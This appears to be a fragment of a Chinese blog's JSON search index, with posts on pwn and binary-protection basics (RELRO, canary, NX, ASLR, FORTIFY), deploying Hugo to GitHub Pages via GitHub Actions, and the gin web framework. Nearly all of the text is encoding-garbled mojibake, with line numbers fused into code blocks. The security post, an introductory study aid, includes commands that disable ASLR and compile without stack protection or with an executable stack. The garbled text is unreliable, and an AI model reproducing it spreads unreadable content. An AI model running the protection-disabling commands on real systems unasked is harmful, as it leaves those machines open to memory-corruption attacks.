é™¤äº†å‚æ•°çš„ä¼ é€’ä¹‹å¤–ï¼Œå‡½æ•°ä¸è°ƒç”¨æ–¹è¿˜å¯ä»¥é€šè¿‡è¿”å›å€¼è¿›è¡Œäº¤äº’ã€‚å½“è¿”å›å€¼ä¸å¤§äº 4 å­—èŠ‚æ—¶ï¼Œè¿”å›å€¼å­˜å‚¨åœ¨ eax å¯„å­˜å™¨ä¸­ï¼Œå½“è¿”å›å€¼åœ¨ 5~8 å­—èŠ‚æ—¶ï¼Œé‡‡ç”¨ eax å’Œ edx ç»“åˆçš„å½¢å¼è¿”å›ï¼Œå…¶ä¸­ eax å­˜å‚¨ä½ 4 å­—èŠ‚ï¼Œ edx å­˜å‚¨é«˜ 4 å­—èŠ‚ã€‚\nå † å…³äºå †çš„æ¯”è¾ƒå¤æ‚ï¼Œæš‚ä¸”ç¨åå†è¡¥å……ã€‚\nå¸¸è§ä¿æŠ¤ æˆ‘ä»¬å¯ä»¥é€šè¿‡checksecå‘½ä»¤æ¥æŸ¥çœ‹æ–‡ä»¶å¼€å¯å“ªäº›ä¿æŠ¤\nRELRO Relocation Read-Only (RELRO) å¯ä»¥ä½¿ç¨‹åºæŸäº›éƒ¨åˆ†æˆä¸ºåªè¯»çš„ã€‚å®ƒåˆ†ä¸ºä¸¤ç§ï¼ŒPartial RELRO å’Œ Full RELROï¼Œå³éƒ¨åˆ†RELRO å’Œ å®Œå…¨RELROã€‚\néƒ¨åˆ†RELRO æ˜¯ GCC çš„é»˜è®¤è®¾ç½®ï¼Œå‡ ä¹æ‰€æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶éƒ½è‡³å°‘ä½¿ç”¨ éƒ¨åˆ†RELROã€‚è¿™æ ·ä»…ä»…åªèƒ½é˜²æ­¢å…¨å±€å˜é‡ä¸Šçš„ç¼“å†²åŒºæº¢å‡ºä»è€Œè¦†ç›– GOTã€‚\nå®Œå…¨RELRO ä½¿æ•´ä¸ª GOT åªè¯»ï¼Œä»è€Œæ— æ³•è¢«è¦†ç›–ï¼Œä½†è¿™æ ·ä¼šå¤§å¤§å¢åŠ ç¨‹åºçš„å¯åŠ¨æ—¶é—´ï¼Œå› ä¸ºç¨‹åºåœ¨å¯åŠ¨ä¹‹å‰éœ€è¦è§£ææ‰€æœ‰çš„ç¬¦å·ã€‚\nCanary stack canary è¡¨ç¤ºæ ˆçš„æŠ¥è­¦ä¿æŠ¤ï¼šåœ¨å‡½æ•°è¿”å›å€¼ä¹‹å‰æ·»åŠ çš„ä¸€ä¸²éšæœºæ•°ï¼ˆä¸è¶…è¿‡æœºå™¨å­—é•¿ï¼‰ï¼Œæœ«ä½ä¸º/x00ï¼ˆæä¾›äº†è¦†ç›–æœ€åä¸€å­—èŠ‚è¾“å‡ºæ³„éœ²canaryçš„å¯èƒ½ï¼‰ï¼Œå¦‚æœå‡ºç°ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼Œè¦†ç›–å†…å®¹è¦†ç›–åˆ°canaryå¤„ï¼Œå°±ä¼šæ”¹å˜åŸæœ¬è¯¥å¤„çš„æ•°å€¼ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°æ­¤å¤„æ—¶ï¼Œä¼šæ£€æŸ¥canaryå€¼æ˜¯å¦è·Ÿå¼€å§‹çš„å€¼ä¸€æ ·ï¼Œå¦‚æœä¸ä¸€æ ·ï¼Œç¨‹åºä¼šå´©æºƒï¼Œä»è€Œè¾¾åˆ°ä¿æŠ¤è¿”å›åœ°å€çš„ç›®çš„ã€‚\nNX å³No-eXecute(ä¸å¯æ‰§è¡Œ)ï¼Œ**NX(DEP)**çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚æ”»å‡»è€…æ„å›¾é€šè¿‡æ ˆæº¢å‡ºä½¿å±€éƒ¨å˜é‡è¦†ç›–è¿”å›åœ°å€ï¼Œç„¶ååŠ å…¥shellcodeï¼Œè€Œé˜²å¾¡è€…åˆ™åˆ©ç”¨NXç­–ç•¥æ˜¯ä½¿æ ˆåŒºåŸŸçš„ä»£ç æ— æ³•æ‰§è¡Œã€‚\nå½“NXä¿æŠ¤å¼€å¯ï¼Œå°±è¡¨ç¤ºé¢˜ç›®æä¾›äº†systemï¼ˆâ€˜/bin/shâ€™)ï¼Œå¦‚æœå…³é—­ï¼Œåˆ™è¦è‡ªå·±æ„é€ shellcode\nPIE PIE(ASLRï¼‰ï¼Œå³å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶ï¼ˆaddress space layout randomizationï¼‰ï¼Œæœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µ:\n1 2 3 4 5 0-å…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ– 1-å°†mmapçš„åŸºå€ï¼Œstackå’Œvsdoé¡µé¢éšæœºåŒ– 2-åœ¨1çš„åŸºç¡€ä¸Š å¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ– è¯¥ä¿æŠ¤ä½¿æ¯æ¬¡è¿è¡Œç¨‹åºçš„åœ°å€éƒ½ä¸åŒï¼Œé˜²æ­¢æ ¹æ®å›ºå®šåœ°å€å†™expæ‰§è¡Œæ”»å‡»\nliunxä¸‹å…³é—­PIEçš„å‘½ä»¤å¦‚ä¸‹ï¼šsudo -s echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\nå…³é—­ä¸Šè¿°é€‰é¡¹çš„å‘½ä»¤:\ngcc -no-pie -fno-stack-protector -z execstack -m32 -o exp1 exp1.c\nFORTIFY FORTIFY_SOURCEæœºåˆ¶ï¼Œåœ¨ç¼–è¯‘æ—¶æ£€æŸ¥æºç æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºç­‰é”™è¯¯ã€‚gccç”Ÿæˆä¸€äº›é™„åŠ ä»£ç ï¼Œé€šè¿‡å¯¹æ•°ç»„å¤§å°çš„åˆ¤æ–­æ›¿æ¢strcpy, memcpy, memsetç­‰å‡½æ•°åï¼Œè¾¾åˆ°é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºçš„ä½œç”¨ã€‚\n","permalink":"http://www.reus09.top/posts/tech/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","summary":"å¤§å››äº†ï¼Œæœ€è¿‘ä¸€ç›´åœ¨æ‘†çƒ‚ï¼Œå› ä¸ºä¹‹å‰å­¦ä¹ è¿‡ä¸€ç‚¹pwnçš„åŸºç¡€ï¼Œæœ€è¿‘ä¹Ÿæ˜¯å†é‡æ–°å›é¡¾ä¸€ä¸‹ï¼Œäº†è§£ä¸€ä¸‹äºŒè¿›åˆ¶å®‰å…¨ã€‚ é€†å‘åŸºç¡€ amd64: 64ä½ AMD64ï¼Œæˆ–â€œx64â€","title":"PwnåŸºç¡€çŸ¥è¯†"},{"content":"æœ€è¿‘é˜¿é‡Œäº‘æœåŠ¡å™¨åˆ°æœŸï¼ŒæœåŠ¡å¤ªè´µäº†ï¼Œæ‰€ä»¥å°±æƒ³ç€ç»§ç»­ä½¿ç”¨githubä½œä¸ºåšå®¢æ­å»ºçš„æ–¹æ³•ã€‚ä»¥å‰ä½¿ç”¨hexoä½œä¸ºé™æ€åšå®¢å·¥å…·ã€‚æœ€è¿‘äº†è§£äº†ä¸€ä¸‹hugo,å‘ç°Hugoçš„ä¸»é¢˜Hugo-PaperModæŒºå¥½çœ‹çš„ï¼Œå°±äº†è§£äº†ä¸€ä¸‹ï¼Œå¹¶ä¸”ç»“åˆgithub action å®ç°è‡ªåŠ¨åŒ–éƒ¨ç½²ã€‚å¹¶ä»ä¸­å­¦ä¹ åˆ°äº†ä¸€äº›gitçš„å‘½ä»¤ï¼Œç¨åä¹Ÿåšä¸€ä¸ªæ•´ç†ä¾¿äºåŠ æ·±å°è±¡ã€‚\nHugo-PaperMod å®‰è£…Hugo mac ç¯å¢ƒç›´æ¥brew install hugoå³å¯å®‰è£…hugo\nåˆ›å»ºç½‘ç«™ å‘½ä»¤hugo new site myblogå¯ä»¥å»ºç«‹ç«™ç‚¹\nç›®å½•å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 . â”œâ”€â”€ archetypes â”‚ â””â”€â”€ default.md // è¿™é‡Œæ˜¯æ¨¡ç‰ˆæ–‡ä»¶ â”œâ”€â”€ config.toml // è¿™é‡Œæ˜¯é…ç½®æ–‡ä»¶ â”œâ”€â”€ content // è¿™é‡Œæ˜¯æ–‡ä»¶å†…å®¹ â”œâ”€â”€ data â”œâ”€â”€ layouts â”œâ”€â”€ static â””â”€â”€ themes 6 directories, 2 files tomlé…ç½®æ–‡ä»¶ä¹Ÿå¯ä»¥æ”¹ä¸ºyamlæ ¼å¼ã€‚\né…ç½®ä¸»é¢˜ åœ¨themesä¸‹ç›´æ¥git clone git@github.com:adityatelange/hugo-PaperMod.git\nç„¶åå¯ä»¥ç¼–å†™config.yamlæ–‡ä»¶äº†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯éœ€è¦æŠŠä¸»é¢˜æ¢ä¸ºè‡ªå·±é€‰æ‹©çš„ä¸»é¢˜:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 baseURL: http://www.reus09.top # baseURL: https://www.sulvblog.cn # ç»‘å®šçš„åŸŸå languageCode: zh-cn # en-us title: Reus09\u0026#39;s Blog theme: hugo-PaperMod # ä¸»é¢˜åå­—ï¼Œå’Œthemesæ–‡ä»¶å¤¹ä¸‹çš„ä¸€è‡´ enableInlineShortcodes: true enableEmoji: true # å…è®¸ä½¿ç”¨ Emoji è¡¨æƒ…ï¼Œå»ºè®® true enableRobotsTXT: true # å…è®¸çˆ¬è™«æŠ“å–åˆ°æœç´¢å¼•æ“ï¼Œå»ºè®® true hasCJKLanguage: true # è‡ªåŠ¨æ£€æµ‹æ˜¯å¦åŒ…å« ä¸­æ–‡æ—¥æ–‡éŸ©æ–‡ å¦‚æœæ–‡ç« ä¸­ä½¿ç”¨äº†å¾ˆå¤šä¸­æ–‡å¼•å·çš„è¯å¯ä»¥å¼€å¯ buildDrafts: false buildFuture: false buildExpired: false #googleAnalytics: UA-123-45 # è°·æ­Œç»Ÿè®¡ # Copyright: Sulv paginate: 10 # é¦–é¡µæ¯é¡µæ˜¾ç¤ºçš„æ–‡ç« æ•° minify: disableXML: true # minifyOutput: true permalinks: post: \u0026#34;/:title/\u0026#34; # post: \u0026#34;/:year/:month/:day/:title/\u0026#34; defaultContentLanguage: en # æœ€é¡¶éƒ¨é¦–å…ˆå±•ç¤ºçš„è¯­è¨€é¡µé¢ defaultContentLanguageInSubdir: true languages: en: languageName: \u0026#34;English\u0026#34; # contentDir: content/english weight: 1 profileMode: enabled: true title: (ã€ƒ\u0026#39;â–½\u0026#39;ã€ƒ) subtitle: \u0026#34;ä¿®ç‚¼æ—¥è®°\u0026#34; imageUrl: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; imageTitle: imageWidth: 150 imageHeight: 150 buttons: - name: ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯ url: posts/tech - name: ğŸ“•é˜…è¯» url: posts/read - name: ğŸ–ç”Ÿæ´» url: posts/life menu: main: - identifier: search name: ğŸ”æœç´¢ url: search weight: 1 - identifier: home name: ğŸ ä¸»é¡µ url: / weight: 2 - identifier: posts name: ğŸ“šæ–‡ç«  url: posts weight: 3 # - identifier: tech # name: ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯æ–‡ç«  # url: posts/tech # weight: 5 # - identifier: life # name: ğŸ–è®°å½•ç”Ÿæ´» # url: posts/life # weight: 6 - identifier: archives name: â±æ—¶é—´è½´ url: archives/ weight: 20 # - identifier: categories # name: ğŸ§©åˆ†ç±» # url: categories # weight: 30 - identifier: tags name: ğŸ”–æ ‡ç­¾ url: tags weight: 40 - identifier: about name: ğŸ™‹ğŸ»â€â™‚ï¸å…³äº url: about weight: 50 - identifier: links name: ğŸ¤å‹é“¾ url: links weight: 60 outputs: home: - HTML - RSS - JSON params: env: production # to enable google analytics, opengraph, twitter-cards and schema. # description: \u0026#34;è¿™æ˜¯ä¸€ä¸ªçº¯ç²¹çš„åšå®¢......\u0026#34; author: Reus09 # author: [\u0026#34;Me\u0026#34;, \u0026#34;You\u0026#34;] # multiple authors ShowAllPagesInArchive: true defaultTheme: auto # defaultTheme: light or dark disableThemeToggle: false DateFormat: \u0026#34;2006-01-02\u0026#34; ShowShareButtons: true ShowReadingTime: true # disableSpecialistPost: true displayFullLangName: true ShowPostNavLinks: true ShowBreadCrumbs: true ShowCodeCopyButtons: true hideFooter: false # éšè—é¡µè„š ShowWordCounts: true VisitCount: true ShowLastMod: true #æ˜¾ç¤ºæ–‡ç« æ›´æ–°æ—¶é—´ ShowToc: true # æ˜¾ç¤ºç›®å½• TocOpen: true # è‡ªåŠ¨å±•å¼€ç›®å½• comments: true socialIcons: - name: github url: \u0026#34;https://github.com/xyming108\u0026#34; - name: twitter url: \u0026#34;img/twitter.png\u0026#34; - name: facebook url: \u0026#34;https://www.facebook.com/profile.php?id=100027782410997\u0026#34; - name: instagram url: \u0026#34;img/instagram.png\u0026#34; - name: QQ url: \u0026#34;img/qq.png\u0026#34; - name: WeChat url: \u0026#34;img/wechat.png\u0026#34; # - name: Phone # url: \u0026#34;img/phone.png\u0026#34; - name: email url: \u0026#34;mailto:1931559710@qq.com\u0026#34; - name: RSS url: \u0026#34;index.xml\u0026#34; # editPost: # URL: \u0026#34;https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content\u0026#34; # Text: \u0026#34;Suggest Changes\u0026#34; # edit text # appendFilePath: true # to append file path to Edit link # label: # text: \u0026#34;Home\u0026#34; # icon: icon.png # iconHeight: 35 # analytics: # google: # SiteVerificationTag: \u0026#34;XYZabc\u0026#34; assets: favicon: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; favicon16x16: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; favicon32x32: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; apple_touch_icon: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; safari_pinned_tab: \u0026#34;https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg\u0026#34; # cover: # hidden: true # hide everywhere but not in structured data # hiddenInList: true # hide on list pages and home # hiddenInSingle: true # hide on single page fuseOpts: isCaseSensitive: false shouldSort: true location: 0 distance: 1000 threshold: 1 minMatchCharLength: 0 keys: [\u0026#34;title\u0026#34;, \u0026#34;permalink\u0026#34;, \u0026#34;summary\u0026#34;] twikoo: version: 1.4.11 taxonomies: category: categories tag: tags series: series markup: goldmark: renderer: unsafe: true # HUGO é»˜è®¤è½¬ä¹‰ Markdown æ–‡ä»¶ä¸­çš„ HTML ä»£ç ï¼Œå¦‚éœ€å¼€å¯çš„è¯ highlight: # anchorLineNos: true codeFences: true guessSyntax: true lineNos: true # noClasses: false # style: monokai style: darcula # codeFencesï¼šä»£ç å›´æ åŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½ä¸€èˆ¬éƒ½è¦è®¾ä¸º true çš„ï¼Œä¸ç„¶å¾ˆéš¾çœ‹ï¼Œå°±æ˜¯å¹²å·´å·´çš„-ä»£ç æ–‡å­—ï¼Œæ²¡æœ‰é¢œè‰²ã€‚ # guessSyntaxï¼šçŒœæµ‹è¯­æ³•ï¼Œè¿™ä¸ªåŠŸèƒ½å»ºè®®è®¾ç½®ä¸º true, å¦‚æœä½ æ²¡æœ‰è®¾ç½®è¦æ˜¾ç¤ºçš„è¯­è¨€åˆ™ä¼šè‡ªåŠ¨åŒ¹é…ã€‚ # hl_Linesï¼šé«˜äº®çš„è¡Œå·ï¼Œä¸€èˆ¬è¿™ä¸ªä¸è®¾ç½®ï¼Œå› ä¸ºæ¯ä¸ªä»£ç å—æˆ‘ä»¬å¯èƒ½å¸Œæœ›è®©é«˜äº®çš„åœ°æ–¹ä¸ä¸€æ ·ã€‚ # lineNoStartï¼šè¡Œå·ä»ç¼–å·å‡ å¼€å§‹ï¼Œä¸€èˆ¬ä» 1 å¼€å§‹ã€‚ # lineNosï¼šæ˜¯å¦æ˜¾ç¤ºè¡Œå·ï¼Œæˆ‘æ¯”è¾ƒå–œæ¬¢æ˜¾ç¤ºï¼Œæ‰€ä»¥æˆ‘è®¾ç½®çš„ä¸º true. # lineNumbersInTableï¼šä½¿ç”¨è¡¨æ¥æ ¼å¼åŒ–è¡Œå·å’Œä»£ç ,è€Œä¸æ˜¯ æ ‡ç­¾ã€‚è¿™ä¸ªå±æ€§ä¸€èˆ¬è®¾ç½®ä¸º true. # noClassesï¼šä½¿ç”¨ class æ ‡ç­¾ï¼Œè€Œä¸æ˜¯å†…åµŒçš„å†…è”æ ·å¼ privacy: vimeo: disabled: false simple: true twitter: disabled: false enableDNT: true simple: true instagram: disabled: false simple: true youtube: disabled: false privacyEnhanced: true services: instagram: disableInlineCSS: true twitter: disableInlineCSS: true hugo å¸¸ç”¨çš„å‘½ä»¤:\nhugo server -D æœ¬åœ°æ¼”ç¤º hugo new xxx/xxx.md è¿™é‡Œçš„xxxä¸ºcontentä¸‹é¢çš„ç›®å½•ä¸‹é¢çš„æ–‡æ¡£ hugo ç”Ÿæˆé™æ€æ–‡ä»¶ Github Action é…ç½®ä»¥åŠè”åˆåŸŸåè§£æ githubæ“ä½œ è¿™é‡Œæˆ‘ä»¬åˆ›å»ºä¸¤ä¸ªä»“åº“ï¼Œä¸€ä¸ªç§æœ‰åº“å­˜å‚¨åšå®¢æºç ï¼Œä¸€ä¸ªå…¬å¼€åº“ï¼Œå³xxxx.github.io.å­˜å‚¨æˆ‘ä»¬çš„åšå®¢é™æ€ç½‘é¡µã€‚\nè¿™é‡Œç§æœ‰åº“ : blog public : reus09.github.io é…ç½®tocken,å› ä¸ºæˆ‘ä»¬éœ€è¦ä»åšå®¢ä»“åº“æ¨é€åˆ°å¤–éƒ¨ GitHub Pages ä»“åº“ï¼Œéœ€è¦ç‰¹å®šæƒé™ï¼Œè¦åœ¨ GitHub è´¦æˆ·ä¸‹ Setting - Developer setting - Personal access tokens ä¸‹åˆ›å»ºä¸€ä¸ª Tokenã€‚éœ€è¦å¼€å¯æƒé™repoå’Œworkflow\né…ç½®åå¤åˆ¶ç”Ÿæˆçš„ Tokenï¼ˆæ³¨ï¼šåªä¼šå‡ºç°ä¸€æ¬¡ï¼‰ï¼Œç„¶ååœ¨æˆ‘ä»¬åšå®¢æºä»“åº“(blog)çš„ Settings - Secrets - Actions ä¸­æ·»åŠ  PERSONAL_TOKEN ç¯å¢ƒå˜é‡ä¸ºåˆšæ‰çš„ Tokenï¼Œè¿™æ · GitHub Action å°±å¯ä»¥è·å–åˆ° Token äº†ã€‚\né˜¿é‡Œäº‘åŸŸåè§£æ åˆ¶å®šè®°å½•ç±»å‹ä¸ºCNAME,ç„¶åä¸»æœºè®°å½•åˆ†åˆ«ä¸º@å’Œwwwï¼Œè®°å½•å€¼ä¸ºreus09.github.ioï¼Œè¿™é‡Œå°±æ˜¯ä½ çš„githubåšå®¢åœ°å€ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ping xxxx.github.io æ¥è·å–å…¶å¯¹åº”çš„çœŸå®IPåœ°å€ã€‚\ngitæ“ä½œ åœ¨hugoåˆå§‹çš„site:myblogä¸‹:\ngit init åˆå§‹åŒ–gitä»“åº“\nåœ¨myblogç›®å½•ä¸‹å»ºç«‹.github/workflows/deploy.yml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 name: deploy on: push: workflow_dispatch: schedule: # Runs everyday at 8:00 AM - cron: \u0026#34;0 0 * * *\u0026#34; jobs: build: runs-on: ubuntu-20.04 steps: - name: Checkout uses: actions/checkout@v2 with: submodules: true fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#34;latest\u0026#34; - name: Build Web run: hugo - name: Deploy Web uses: peaceiris/actions-gh-pages@v3 with: # è¿™é‡Œå³ä¸º æˆ‘ä»¬ä¸Šæ–‡ä¸­ä¸º blog ç”Ÿæˆçš„secret PERSONAL_TOKEN: ${{ secrets.PERSONAL_TOKEN }} # è¿™é‡ŒæŒ‡å‘è‡ªå·±çš„githubo åšå®¢åœ°å€ EXTERNAL_REPOSITORY: reus09/reus09.github.io PUBLISH_BRANCH: master PUBLISH_DIR: ./public # æŒ‡å®š CNAME CNAME: www.reus09.top commit_message: ${{ github.event.head_commit.message }} on è¡¨ç¤º GitHub Action è§¦å‘æ¡ä»¶ï¼Œæˆ‘è®¾ç½®äº† pushã€workflow_dispatch å’Œ schedule ä¸‰ä¸ªæ¡ä»¶ï¼š\npushï¼Œå½“è¿™ä¸ªé¡¹ç›®ä»“åº“å‘ç”Ÿæ¨é€åŠ¨ä½œåï¼Œæ‰§è¡Œ GitHub Action workflow_dispatchï¼Œå¯ä»¥åœ¨ GitHub é¡¹ç›®ä»“åº“çš„ Action å·¥å…·æ è¿›è¡Œæ‰‹åŠ¨è°ƒç”¨ scheduleï¼Œå®šæ—¶æ‰§è¡Œ GitHub Actionï¼Œå¦‚æˆ‘çš„è®¾ç½®ä¸ºåŒ—äº¬æ—¶é—´æ¯å¤©æ—©ä¸Šæ‰§è¡Œï¼Œä¸»è¦æ˜¯ä½¿ç”¨ä¸€äº›è‡ªåŠ¨åŒ–ç»Ÿè®¡ CI æ¥è‡ªåŠ¨æ›´æ–°æˆ‘åšå®¢çš„å…³äºé¡µé¢ï¼Œå¦‚æœ¬å‘¨ç¼–ç æ—¶é—´ï¼Œå½±éŸ³è®°å½•ç­‰ï¼Œå¦‚æœä½ ä¸éœ€è¦å®šæ—¶åŠŸèƒ½ï¼Œå¯ä»¥åˆ é™¤è¿™ä¸ªæ¡ä»¶ jobs è¡¨ç¤º GitHub Action ä¸­çš„ä»»åŠ¡ï¼Œæˆ‘ä»¬è®¾ç½®äº†ä¸€ä¸ª build ä»»åŠ¡ï¼Œruns-on è¡¨ç¤º GitHub Action è¿è¡Œç¯å¢ƒï¼Œæˆ‘ä»¬é€‰æ‹©äº† ubuntu-latestã€‚æˆ‘ä»¬çš„ build ä»»åŠ¡åŒ…å«äº† Checkoutã€Setup Hugoã€Build Web å’Œ Deploy Web å››ä¸ªä¸»è¦æ­¥éª¤ï¼Œå…¶ä¸­ run æ˜¯æ‰§è¡Œçš„å‘½ä»¤ï¼Œuses æ˜¯ GitHub Action ä¸­çš„ä¸€ä¸ªæ’ä»¶ï¼Œæˆ‘ä»¬ä½¿ç”¨äº† peaceiris/actions-hugo@v2 å’Œ peaceiris/actions-gh-pages@v3 è¿™ä¸¤ä¸ªæ’ä»¶ã€‚å…¶ä¸­ Checkout æ­¥éª¤ä¸­ with ä¸­é…ç½® submodules å€¼ä¸º true å¯ä»¥åŒæ­¥åšå®¢æºä»“åº“çš„å­æ¨¡å—ï¼Œå³æˆ‘ä»¬çš„ä¸»é¢˜æ¨¡å—ã€‚\nç»è¿‡ä¸Šè¿°é…ç½®ï¼Œæˆ‘ä»¬å·²ç»å®ç°äº† Hugo åšå®¢æœ¬åœ°æ­å»ºåŠç‰ˆæœ¬ç®¡ç†ã€GitHub Pages éƒ¨ç½²ç½‘ç«™å‘å¸ƒï¼ŒHugp ä¸»é¢˜ç®¡ç†åŠæ›´æ–°ç­‰åŠŸèƒ½ï¼Œå®ç°äº†å®Œæ•´çš„ç³»ç»Ÿã€‚ç°åœ¨æ¯å½“æˆ‘ä»¬æœ¬åœ°é€šè¿‡ç†Ÿæ‚‰çš„ Markdown è¯­æ³•å®Œæˆåšå®¢å†…å®¹ç¼–è¾‘åï¼Œåªéœ€è¦æ¨é€ä»£ç ï¼Œç­‰å¾…å‡ åˆ†é’Ÿï¼Œå³å¯é€šè¿‡æˆ‘ä»¬çš„è‡ªå®šä¹‰åŸŸåè®¿é—®æ›´æ–°åçš„ç½‘ç«™ã€‚\n1 2 3 4 git remote add origin git@github.com:reus09/blog.git git add -A git commit -m \u0026#34;test\u0026#34; git push -u origin master -f å³å¯å®ç°è‡ªåŠ¨åŒ–ä¸Šä¼ æºç  é—®é¢˜ åœ¨ä¸Šè¿°é…ç½®å¥½ä¹‹åï¼Œpushä¹‹åå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨checkoutæœ‰ä¸ªé—®é¢˜\nå³ä»–åœ¨.gitmodulesæ²¡æœ‰è¿™ä¸ª submodule path\näºæ˜¯æˆ‘ä»¬åœ¨myblogç›®å½•ä¸‹åŠ å…¥.gitmodules\n1 2 3 4 [submodule \u0026#34;themes/hugo-PaperMod\u0026#34;] path = themes/hugo-PaperMod url = https://github.com/adityatelange/hugo-PaperMod branch = master å‘ç°å°±å¯ä»¥è§£å†³äº† ","permalink":"http://www.reus09.top/posts/tech/hugo%E9%83%A8%E7%BD%B2github/","summary":"æœ€è¿‘é˜¿é‡Œäº‘æœåŠ¡å™¨åˆ°æœŸï¼ŒæœåŠ¡å¤ªè´µäº†ï¼Œæ‰€ä»¥å°±æƒ³ç€ç»§ç»­ä½¿ç”¨githubä½œä¸ºåšå®¢æ­å»ºçš„æ–¹æ³•ã€‚ä»¥å‰ä½¿ç”¨hexoä½œä¸ºé™æ€åšå®¢å·¥å…·ã€‚æœ€è¿‘äº†è§£äº†ä¸€ä¸‹hugo","title":"Hugoéƒ¨ç½²github"},{"content":"å¯¹å¼€æºçš„å¼€å‘æ¡†æ¶ginè¿›è¡Œäº†ç®€å•çš„å­¦ä¹ ï¼Œå¯¹å¸¸ç”¨çš„è¿›è¡Œäº†ç®€å•çš„æ•´ç†ã€‚\nåˆå§‹åŒ– è¿™é‡Œç›´æ¥ç»™å‡ºä¸€ä¸ªé€šç”¨çš„æ¨¡æ¿ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 func main(){ // ä½¿ç”¨é»˜è®¤ä¸­é—´ä»¶åˆ›å»ºä¸€ä¸ªginè·¯ç”±å™¨ // logger and recovery (crash-free) ä¸­é—´ä»¶ router := gin.Default() // åŠ è½½templatesç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸ºhtml router.LoadHTMLGlob(\u0026#34;/templates/**\u0026#34;) router.GET(\u0026#34;/someGet\u0026#34;, getting) router.POST(\u0026#34;/somePost\u0026#34;, posting) router.PUT(\u0026#34;/somePut\u0026#34;, putting) router.DELETE(\u0026#34;/someDelete\u0026#34;, deleting) router.PATCH(\u0026#34;/somePatch\u0026#34;, patching) router.HEAD(\u0026#34;/someHead\u0026#34;, head) router.OPTIONS(\u0026#34;/someOptions\u0026#34;, options) // Simple group: v1 v1 := router.Group(\u0026#34;/v1\u0026#34;) {\t// /v1/login v1.POST(\u0026#34;/login\u0026#34;, loginEndpoint) v1.POST(\u0026#34;/submit\u0026#34;, submitEndpoint) v1.POST(\u0026#34;/read\u0026#34;, readEndpoint) } // é»˜è®¤å¯åŠ¨çš„æ˜¯ 8080ç«¯å£ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å®šä¹‰å¯åŠ¨ç«¯å£ router.Run() // router.Run(\u0026#34;:3000\u0026#34;) for a hard coded port } gin.Default()åˆå§‹äº†ä¸­é—´ä»¶ï¼Œé»˜è®¤ä¸ºloggerå’Œrecovery,ä¹Ÿå¯ä»¥é€šè¿‡gin.New()å®ç°æ— ä¸­é—´ä»¶å¯åŠ¨æœåŠ¡ åŒæ—¶ginä¹Ÿæ”¯æŒä¸ƒç§HTTPè¯·æ±‚æ–¹å¼ï¼Œæ–¹ä¾¿åç«¯ä¸šåŠ¡å¢åˆ æ”¹æŸ¥çš„è°ƒç”¨ã€‚ è·å–å‚æ•° Resté£æ ¼è·å–å‚æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // æ­¤è§„åˆ™èƒ½å¤ŸåŒ¹é…/user/johnè¿™ç§æ ¼å¼ï¼Œä½†ä¸èƒ½åŒ¹é…/user/ æˆ– 